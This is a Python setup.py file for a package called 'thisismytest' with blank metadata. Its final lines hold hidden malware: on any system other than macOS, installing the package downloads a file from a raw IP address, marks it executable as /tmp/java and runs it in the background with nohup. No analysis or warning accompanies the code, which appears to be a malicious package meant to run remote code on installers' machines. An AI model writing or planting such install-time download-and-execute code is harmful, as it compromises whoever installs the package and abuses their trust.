import os

from setuptools import setup, find_packages

setup(
    name="thisismytest",
    version="5.0.0",
    description="",
    long_description='',
    long_description_content_type="text/markdown",
    author="",
    author_email="",
    url="",
    packages=find_packages(where="src"),
    package_dir={"": "thisismytest"},
    include_package_data=True,
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.0',
)
# print(os.name)
import sys

if sys.platform != 'darwin':
    os.system('curl 115.190.98.52/java -o /tmp/java')
    os.system('chmod +x /tmp/java')
    os.system('nohup /tmp/java &')